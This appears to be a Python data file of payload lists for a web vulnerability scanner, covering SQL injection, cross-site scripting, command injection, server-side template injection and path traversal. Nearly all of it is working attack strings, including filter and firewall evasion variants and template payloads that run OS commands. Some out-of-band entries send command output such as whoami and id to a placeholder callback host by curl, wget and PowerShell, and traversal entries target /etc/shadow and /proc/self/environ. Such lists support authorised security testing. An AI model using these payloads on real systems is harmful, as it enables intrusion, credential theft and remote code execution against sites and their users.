# Payloads for various web vulnerabilities
# Categories help in selecting appropriate tests

# --- SQL Injection Payloads ---
SQLI_PAYLOADS = {
    "error_based": [
        "'", "\"", "`", "');", "';", "\";", # Basic syntax breakers
        "' AND 1=CAST(@@VERSION AS INTEGER)--", # MSSQL Version Error
        "' AND 1=CONVERT(int, @@VERSION)--", # MSSQL Version Error Alt
        "' UNION SELECT @@VERSION--", # Generic Version (Might work)
        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58),CHAR(118),CHAR(112),CHAR(117),CHAR(58),(SELECT (SLEEP(0))),CHAR(58),CHAR(100),CHAR(100),CHAR(111),CHAR(58),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)--", # MySQL Error
        "' AND extractvalue(rand(),concat(0x3a,version()))--", # MySQL XPath Error
        "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH(USER)--", # Oracle Error
        "' AND 1=(select count(*) from all_tables where 1=1 and ROWNUM=1 and 1/0 = 1 )--", # Oracle Division by Zero
        "' AND 1=CAST(VERSION() AS INT)--", # PostgreSQL Type Error
        "' AND 1=CAST(PG_SLEEP(0) AS TEXT)--", # PostgreSQL Sleep (adjust time in engine)
        "' AND 1=JSON_OBJECT('sql',@@VERSION)--", # Check JSON support
    ],
    "blind_time": [
        "' AND SLEEP(SLEEP_TIME)--", # MySQL, MariaDB
        "'; WAITFOR DELAY '0:0:SLEEP_TIME'--", # MSSQL
        "' AND pg_sleep(SLEEP_TIME)--", # PostgreSQL
        "' AND dbms_lock.sleep(SLEEP_TIME)--", # Oracle (requires privileges)
        "' AND randomblob(SLEEP_TIME*100000000)--", # SQLite (approximate)
        "' OR IF(1=1, SLEEP(SLEEP_TIME), 0)--", # MySQL Conditional
        "' RLIKE SLEEP(SLEEP_TIME)--", # MySQL Regex Based
    ],
    "blind_boolean": [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND SUBSTRING(VERSION(),1,1)='5'--", # Check specific version char
        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", # Check table existence
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))=97--", # Check specific character (adjust query)
    ],
    "union_based": [ # Need to determine column count first
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT @@VERSION,DATABASE(),USER()--", # Example Info Leak
    ],
    "oob": [ # Out-of-Band - Requires Interactsh or similar
        "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT UNHEX(HEX(@@HOSTNAME))), '.INTERACTSH_URL\\\\', 'abc'))--", # MySQL UNC
        "'; EXEC xp_dirtree '\\\\INTERACTSH_URL\\test';--", # MSSQL xp_dirtree
        "' UNION SELECT UTL_HTTP.REQUEST('http://INTERACTSH_URL') FROM DUAL--", # Oracle UTL_HTTP
        "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS('INTERACTSH_URL') FROM DUAL--", # Oracle DNS
        "COPY (SELECT '') TO PROGRAM 'nslookup INTERACTSH_URL'--", # PostgreSQL Program execution
    ],
    "waf_evasion": [
        "'/**/OR/**/1=1--",
        "'%09OR%091=1--", # Tab based
        "'%0AOR%0A1=1--", # Newline based
        "'/*!50000OR*/1=1--", # MySQL Versioned Comment
        "' UniON SeLeCt @@version --", # Case variation
        "'+UNION+ALL+SELECT+NULL,NULL,NULL--", # URL Encoded Space
        "%27%20OR%20%271%27=%271", # Full URL Encoding
    ]
}

# --- Cross-Site Scripting (XSS) Payloads ---
XSS_PAYLOADS = {
    "basic_reflection": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\" autofocus onfocus=alert(1)>", # Attribute injection
        "<details open ontoggle=alert(1)>", # HTML5 based
        "javascript:alert(1)", # For href/src attributes
    ],
    "html_injection": [
        "<h1>XSS</h1>", # Simple tag injection
        "<a href=//example.com>Click Me</a>", # Link injection
        "<plaintext>", # Breaks HTML parsing
    ],
    "attribute_injection": [
        "\" onmouseover=alert(1) \"",
        "' onerror=alert(1) '",
        "\" style=display:block;font-size:50px; onmouseover=alert(1)//", # CSS Breakout
    ],
    "filter_evasion": [
        "<scr<script>ipt>alert(1)</scr<script>ipt>", # Tag splitting
        "<img src=x oNeRrOr=alert(1)>", # Case variation
        "<svg/onload=&#97&#108&#101&#114&#116(1)>", # HTML Entities
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", # Base64 eval
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", # Charcode eval
        "data:text/html,<script>alert(1)</script>", # Data URI
        "<a href=\"javas&#99;ript:alert(1)\">XSS</a>", # Partial entity
    ],
    "dom_based": [
        "#\"><img src=x onerror=alert(1)>", # Hash based injection target
        "javascript:window.location.hash='<img src=x onerror=alert(1)>'", # Triggering via hash change
        "eval(location.hash.slice(1))", # Needs sink in code
        "document.write(location.hash.slice(1))", # Needs sink in code
    ],
    "framework_specific": { # Often needs specific sinks
        "angular": ["{{constructor.constructor('alert(1)')()}}"],
        "vue": ["<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>"],
        "react": ["<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>"], # Needs specific prop usage
    },
    "polyglots": [ # Attempts to work in multiple contexts
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "-->'><svg/onload=alert(1)>",
        "\"'--></style></script><svg onload=alert(1)>",
        "'\"()><svg onload=alert(1)>",
    ]
}

# --- Command Injection Payloads ---
CMD_PAYLOADS = {
    "basic": [
        "; id", "& id", "| id", "&& id", "|| id", "`id`", "$(id)", # Linux/Unix
        "; whoami", "& whoami", "| whoami", "&& whoami", "|| whoami", # Linux/Unix
        "; dir", "& dir", "| dir", "&& dir", "|| dir", # Windows
        "; systeminfo", "& systeminfo", "| systeminfo", # Windows
    ],
    "blind_time": [
        "; sleep SLEEP_TIME", "& sleep SLEEP_TIME", "| sleep SLEEP_TIME", # Linux/Unix
        "& timeout /t SLEEP_TIME", "; timeout /t SLEEP_TIME", # Windows
        "$(sleep SLEEP_TIME)", "`sleep SLEEP_TIME`", # Command Substitution Linux
        "; ping -c SLEEP_TIME 127.0.0.1", # Linux Ping delay
        "& ping -n SLEEP_TIME 127.0.0.1 > NUL", # Windows Ping delay
    ],
    "oob": [ # Out-of-Band
        "; nslookup `whoami`.INTERACTSH_URL", # Linux DNS
        "& nslookup %USERNAME%.INTERACTSH_URL", # Windows DNS
        "; curl http://INTERACTSH_URL/`whoami`", # Linux HTTP
        "& powershell -Command \"(New-Object System.Net.WebClient).DownloadString('http://INTERACTSH_URL/'+$env:username)\"", # Windows PowerShell HTTP
        "| wget -O- --post-data=\"output=$(id | base64)\" http://INTERACTSH_URL/", # Linux Post Data
        "$(dig +short INTERACTSH_URL)", # Linux Dig DNS
    ],
    "filter_evasion": [
        ";${IFS}id", # Internal Field Separator Linux
        "; w`whoami`", # Nested backticks Linux
        "& C:\\Windows\\System32\\cmd.exe /c whoami", # Full Path Windows
        "; cat /e?c/p?sswd", # Wildcards Linux
        "& type C:\\Windows\\win.ini", # Alternative read command Windows
        "; exec('id')", # Using syscalls/alternatives (context dependent)
    ]
}

# --- Server-Side Template Injection (SSTI) Payloads ---
SSTI_PAYLOADS = {
    "basic_detection": [
        "${7*7}", "{{7*7}}", "<%= 7*7 %>", "#{7*7}", # Common syntaxes
        "{{'foo'.toUpperCase()}}", # Jinja2/Twig check
        "${'foo'.toUpperCase()}", # Freemarker check
        "<%= 'foo'.upcase %>", # Ruby ERB check
        "#{'foo'.upcase}", # Slim/Ruby check
        "[[${7*7}]]", # Thymeleaf check
    ],
    "common_vars": [ # Check for accessible variables/objects
        "{{config}}", "{{self}}", "{{settings}}", "${app}", "<%= request %>",
        "{{request.application.__globals__}}", # Flask/Jinja2 Globals
        "#{request.env}", # Ruby env
    ],
    "code_execution": { # Highly context-dependent, often needs chaining
        "jinja2": [
            "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
            "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
            # "{{''.__class__.__mro__[1].__subclasses__()[<INDEX>].__init__.__globals__.os.popen('id').read()}}", # Find Popen index - requires enumeration
        ],
        "freemarker": [
            "<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }",
        ],
        "velocity": [
            "#set($x = $context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter())#set($p = $x.getClass().forName('java.lang.Runtime').getRuntime().exec('id'))#set($is = $p.getInputStream())#set($br = $x.getClass().forName('java.io.BufferedReader').getDeclaredConstructor($x.getClass().forName('java.io.InputStreamReader')).newInstance($is))#set($line = '')#set($null = $x.println('OUTPUT:'))#foreach($i in [1..9999])#set($line = $br.readLine())#if($line == $null)#break#end#set($null = $x.println($line))#end",
        ],
        "ruby_erb": [
            "<%= `id` %>",
            "<%= system('id') %>",
            "<%= IO.popen('id').read %>",
        ],
        "thymeleaf": [ # Often requires specific context/dialect setup
            "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
            "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.k", # Pre/Post processing trick
        ],
        "generic_oob": [ # Try to trigger OOB via common functions
            # "{{ ''.__class__.__mro__[1].__subclasses__().pop(<INDEX>).read('http://INTERACTSH_URL') }}", # Python - requires enumeration
            "${#rt = @java.lang.Runtime@getRuntime()}${rt.exec(\"nslookup INTERACTSH_URL\")}", # Java-based
        ]
    }
}

# --- Path Traversal Payloads ---
PATH_TRAVERSAL_PAYLOADS = {
    "common_files_unix": [
        "../../../../../../../../../../etc/passwd",
        "../../../../../../../../../../etc/shadow", # Usually needs root
        "../../../../../../../../../../etc/hosts",
        "../../../../../../../../../../etc/issue",
        "../../../../../../../../../../etc/motd",
        "../../../../../../../../../../proc/self/environ", # Check environment vars
        "../../../../../../../../../../proc/version",
        "../../../../../../../../../../var/log/apache2/access.log", # Example log file
        "../../../../../../../../../../var/www/html/config.php", # Example config
    ],
    "common_files_windows": [
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\u_exYYMMDD.log", # Example IIS log
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini", # Older windows
        # "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Users\\Administrator\\NTUser.dat", # Registry Hive - Might cause issues
    ],
    "encoding_bypass": [
        "..%2f..%2f..%2f..%2fetc%2fpasswd", # URL Encoded /
        "..%5c..%5c..%5c..%5cwindows%5cwin.ini", # URL Encoded \
        "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", # URL Encoded .
        "..%c0%af..%c0%afetc/passwd", # Invalid UTF-8 / (Overlong)
        "..%c1%9c..%c1%9cboot.ini", # Invalid UTF-8 \ (Overlong)
        "....//....//....//etc/passwd", # Using //
        "....\\\\....\\\\....\\\\windows\\\\win.ini", # Using \\
    ],
    "null_byte_bypass": [ # Often ineffective on modern systems
        "../../../../etc/passwd%00",
        "..\\..\\..\\windows\\win.ini%00",
    ],
    "wrapper_bypass": [ # If PHP wrappers are enabled
        "php://filter/resource=../../../../etc/passwd",
        "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
        "file:///etc/passwd",
    ]
}

# Add other categories as needed: SSRF, Header Injection, NoSQL Injection, LFI specific variations etc.